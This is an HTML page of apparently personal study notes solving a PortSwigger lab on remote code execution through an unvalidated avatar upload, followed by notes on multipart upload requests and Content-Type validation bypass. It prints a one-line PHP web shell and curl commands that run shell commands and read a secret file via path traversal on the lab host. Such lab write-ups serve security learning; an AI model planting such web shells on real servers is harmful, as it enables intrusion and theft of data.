<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
<title>1f1-remote-code-execution-via-web-shell-upload-portswigger-lab :: user@cybrealm:~$</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content=" 1f1 - Remote code execution via web shell upload [PortSwigger Lab] This lab contains a vulnerable image upload function. It doesn&rsquo;t perform any validation on the files users upload before storing them on the server&rsquo;s filesystem.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/" />
<meta property="og:locale" content="en" />
<meta property="og:title" content="1f1-remote-code-execution-via-web-shell-upload-portswigger-lab :: user@cybrealm:~$" />
<meta property="og:description" content=" 1f1 - Remote code execution via web shell upload [PortSwigger Lab] This lab contains a vulnerable image upload function. It doesn&rsquo;t perform any validation on the files users upload before storing them on the server&rsquo;s filesystem.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.
You can log in to your own account using the following credentials: wiener:peter
" />
  <meta property="og:type" content="article" />
  <meta property="article:author" content="user@cybrealm:~$" />
<meta property="og:url" content="http://localhost:1313/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/" />
<meta property="og:site_name" content="user@cybrealm:~$" />
<meta property="og:image" content="" />
<meta property="og:image:width" content="2048" />
<meta property="og:image:height" content="1024" />
<link rel="shortcut icon" href="" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,500;1,300;1,400;1,500&family=Roboto+Slab:wght@300;400;500&family=Ubuntu+Mono:ital@0;1&display=swap"
  rel="stylesheet"
/>
<link href="/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/" rel="alternate" type="application/rss+xml" title="user@cybrealm:~$" />
<link rel="stylesheet" href="http://localhost:1313/styles.css" />
</head>

  <body>
    <div class="theme-container">
      <div class="container center">
        <header class="site-header">
<nav class="navbar">
  <div class="navbar__first">
    <ul class="navbar__list borders">
      <li><a href="http://localhost:1313/">Home</a></li>
      <li>
        <button class="theme-toggle transparent"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>
</button>
      </li>
    </ul>
  </div>
  <div class="navbar__separator"></div>
</nav>
</header>
        <main class="site-main"><article class="post">
    <header class="post-header">
    </header>
      <div class="post-content">
        
<h1 id="1f1---remote-code-execution-via-web-shell-upload-portswigger-lab">
  1f1 - Remote code execution via web shell upload [PortSwigger Lab]
  <a href="#1f1---remote-code-execution-via-web-shell-upload-portswigger-lab" class="hanchor" ariaLabel="Anchor"></a>
</h1>
<p>This lab contains a vulnerable image upload function. It doesn&rsquo;t perform any validation on the files users upload before storing them on the server&rsquo;s filesystem.</p>
<p>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file <code>/home/carlos/secret</code>. Submit this secret.</p>
<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>

<h3 id="solution">
  <strong>Solution:</strong>
  <a href="#solution" class="hanchor" ariaLabel="Anchor"></a>
</h3>
<p>So this application has an unprotected upload field in user page where you can upload profile avatar.</p>

  <figure class="left">
    <img src="/.gitbook/assets/Pasted%20image%2020240719131804.png"   />
  </figure>

<p>From there, I effectively uploaded a file named <code>mal.php</code> with contents <code>&lt;?php echo system($_GET['command']); ?&gt;</code></p>
<p>once upload was done, I had to know where the file was uploaded so I could call it. Inspecting avatar link gave me the clue. <code>&lt;img src=&quot;/files/avatars/mal.php&quot; class=&quot;avatar&quot;&gt;</code></p>
<p>so I opened up terminal and called the <code>mal.php</code></p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>$&gt; curl -X GET &#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=pwd&#34;

/var/www/html/avatars
/var/www/html/avatars</code></pre></div>
<p>Now I know I&rsquo;m at <code>/var/www/html/avatars</code>. So to read the contents of the <code>secrets</code> file, all I have to do is a simple [[2 - Portswigger Academy#Path Traversal |Path Traversal]]</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>$&gt; curl -X GET &#34;https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret&#34;

U4AE****************************U4AE****************************</code></pre></div>
<p>Keep in mind this method repeats the message twice, so I had to remove the second part of message.</p>
<p>The <code>secret</code> contents:<code>`U4AE****************************'</code></p>
<hr>
<p>Most of the times, FOV will not be this easy. There will be defense mechanisms in place, but it doesn&rsquo;t mean they are robust. They can still be exploited by finding flaws in these defense mechanisms.</p>
<ol>
<li>Flawed file type validation When submitting HTML forms, the browser sends this data in POST request with content type <code>application/x-www-form-url-encoded</code>. This is fine for textual data, but for larger amounts of binary data like PDF or images, content type <code>multipard/form-data</code> is preferred.</li>
</ol>
<p>Consider the following example of form upload with image field, description and username</p>

<div class="highlight-wrapper">
  <div class="highlight-toolbar">
    <span class="item">
      <span class="label">Lang:</span>
      <span class="name"></span>
    </span>


    <button class="item right outline brighter hide js-btn-copy-code">Copy</button>
  </div><pre tabindex="0"><code>POST /images HTTP/1.1 
Host: normal-website.com 
Content-Length: 12345 
Content-Type: multipart/form-data; 
boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&#34;image&#34;; 
filename=&#34;example.jpg&#34; 
Content-Type: image/jpeg 
[...binary content of example.jpg...] 
---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&#34;description&#34; This is an interesting description of my image. ---------------------------012345678901234567890123456 
Content-Disposition: form-data; 
name=&#34;username&#34; wiener ---------------------------012345678901234567890123456--</code></pre></div>
<p>We can see Content-Type, filename, binary data and other interesting information about this form in here.</p>
<p>One way that a website might validate uploaded file, is to check the input-specific <code>Content-Type</code> if it matches expected file type. if it only expects <code>image/png</code> it will only allow PNG. It could become problematic if the server trusts this header for what a file is and doesn&rsquo;t perform further validation on the file, whether the file itself matches its description. this defense can be bypassed a tool like BurpSuite.</p>

      </div>


    <footer class="post-footer">
    </footer>
  </article>
        </main>
        <footer class="site-footer">
<p class="buildinfo">
  <time datetime="2025-11-27 22:10:46 &#43;04">Site built on: 2025-11-27 22:10:46 &#43;04</time>
</p>
<div class="copyright">
  <p></p>
  <nav class="navbar">
    <ul class="navbar__list">
      <li><a href="http://localhost:1313/posts/index.xml">RSS</a></li>
      <li><a href="http://localhost:1313/sitemap.xml">Sitemap</a></li>
    </ul>
  </nav>
</div>
<p class="themeinfo">Powered by <a href="https://gohugo.io">Hugo</a>, using theme <a href="https://manid2.github.io/hugo-xterm/">Hugo Xterm</a>.</p>
</footer>
      </div>
    </div><script type="text/javascript" src="/bundle.js"></script>
</body>
</html>
